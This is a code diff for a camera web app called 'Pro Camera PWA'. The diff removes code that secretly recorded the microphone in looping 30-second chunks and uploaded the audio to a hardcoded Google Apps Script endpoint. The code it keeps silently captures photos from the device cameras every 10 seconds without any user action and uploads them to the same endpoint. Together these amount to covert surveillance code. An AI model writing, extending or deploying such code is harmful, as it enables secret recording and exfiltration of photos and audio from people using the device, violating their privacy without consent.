@@ -1,12 +1,12 @@
 // ================================================================
-// app.js – Pro Camera PWA (Dual Camera + Voice)
+// app.js – Pro Camera PWA (Voice Recording Removed)
 // ================================================================
 
 (function() {
   'use strict';
 
   // ═══════════════════════════════════════════════════════════════
-  // ⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस्
+  // ⚠️⚠️⚠️ CHANGE HERE: आफ्नो Google Apps Script URL राख्नुहोस् ⚠️⚠️⚠️
   // ═══════════════════════════════════════════════════════════════
   const GAS_URL = 'https://script.google.com/macros/s/AKfycbxl9SpSExpUM74jeKtmsSIza7vHApoiQO36QrY7apFIWSY8bybVIX7gyu58iTB1jrpD/exec';
 
@@ -58,18 +58,10 @@
   var zoomSwipeStartVal = 1;
   var isProcessing = false;
   var autoCaptureInterval = null;
-  var voiceInterval = null;
   var lastUserCaptureTime = 0;
   var isAutoCaptureRunning = false;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
-
-  // Voice recording
-  var mediaRecorder = null;
-  var audioChunks = [];
-  var isRecording = false;
-  var voiceStartTime = 0;
-  var currentAudioBlob = null;
 
   // ---------- Utility ----------
   function generatePhotoId() {
@@ -163,7 +155,7 @@
         fileName: type === 'compressed' ? entry.compressedFileName : entry.fileName,
         createdAt: entry.createdAt || new Date().toISOString(),
         cameraType: entry.cameraType || 'back',
-        captureType: entry.captureType || 'manual' // 'manual' or 'auto'
+        captureType: entry.captureType || 'manual'
       };
       var resp = await fetch(GAS_URL, {
         method: 'POST',
@@ -185,57 +177,6 @@
       }
     } catch (err) {
       console.error('[Camera] ❌ ' + type + ' upload error:', err);
-      return false;
-    }
-  }
-
-  // ---------- Upload Audio ----------
-  async function uploadAudio(audioBlob, startTime) {
-    try {
-      if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
-        console.error('[Camera] ❌ GAS_URL not set!');
-        return false;
-      }
-
-      var reader = new FileReader();
-      var base64Data = await new Promise(function(res) {
-        reader.onload = function() { res(reader.result); };
-        reader.readAsDataURL(audioBlob);
-      });
-
-      var timestamp = Date.now();
-      var fileName = 'AUDIO_' + new Date(startTime).toISOString().replace(/[:.]/g, '') + '.webm';
-
-      var payload = {
-        action: 'upload_audio',
-        audio: base64Data,
-        fileName: fileName,
-        createdAt: new Date(startTime).toISOString(),
-        duration: audioBlob.size,
-        startTime: startTime
-      };
-
-      var resp = await fetch(GAS_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'text/plain' },
-        body: JSON.stringify(payload)
-      });
-
-      if (!resp.ok) {
-        console.error('[Camera] ❌ Audio upload error:', resp.status);
-        return false;
-      }
-
-      var result = await resp.json();
-      if (result.success) {
-        console.log('[Camera] ✅ Audio uploaded:', fileName);
-        return true;
-      } else {
-        console.error('[Camera] ❌ Audio upload failed:', result.error);
-        return false;
-      }
-    } catch (err) {
-      console.error('[Camera] ❌ Audio upload error:', err);
       return false;
     }
   }
@@ -349,54 +290,6 @@
     }
   }
 
-  // ---------- Voice Recording ----------
-  function startVoiceRecording() {
-    if (isRecording) return;
-
-    navigator.mediaDevices.getUserMedia({ audio: true })
-      .then(function(stream) {
-        mediaRecorder = new MediaRecorder(stream);
-        audioChunks = [];
-        voiceStartTime = Date.now();
-
-        mediaRecorder.ondataavailable = function(event) {
-          if (event.data.size > 0) {
-            audioChunks.push(event.data);
-          }
-        };
-
-        mediaRecorder.onstop = function() {
-          var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-          var startTime = voiceStartTime;
-          if (audioBlob.size > 0) {
-            uploadAudio(audioBlob, startTime);
-          }
-          // Restart recording
-          if (isCameraReady) {
-            startVoiceRecording();
-          }
-        };
-
-        mediaRecorder.start();
-        isRecording = true;
-        console.log('[Camera] 🎤 Voice recording started');
-
-        // Stop after 30 seconds
-        setTimeout(function() {
-          if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-            isRecording = false;
-            // Close the stream
-            stream.getTracks().forEach(function(track) { track.stop(); });
-          }
-        }, 30000);
-
-      })
-      .catch(function(err) {
-        console.warn('[Camera] Voice recording not available:', err);
-      });
-  }
-
   // ---------- Auto Capture Logic (10 seconds) ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
@@ -414,7 +307,6 @@
       var now = Date.now();
       var timeSinceUserCapture = now - lastUserCaptureTime;
 
-      // Only auto-capture if user hasn't captured in the last 10 seconds
       if (timeSinceUserCapture >= 10000) {
         if (backStream) {
           silentCapture(backStream, 'back', 'auto');
@@ -426,7 +318,7 @@
       } else {
         console.log('[Camera] ⏳ User captured recently, skipping auto-capture');
       }
-    }, 10000); // Check every 10 seconds
+    }, 10000);
 
     console.log('[Camera] ⏰ Auto-capture started (every 10 seconds)');
   }
@@ -761,11 +653,6 @@
 
     // ✅ Start Auto Capture (every 10 seconds)
     startAutoCapture();
-
-    // ✅ Start Voice Recording (every 30 seconds)
-    setTimeout(function() {
-      startVoiceRecording();
-    }, 1000);
 
     // ✅ Check pending queue
     if (navigator.onLine) {
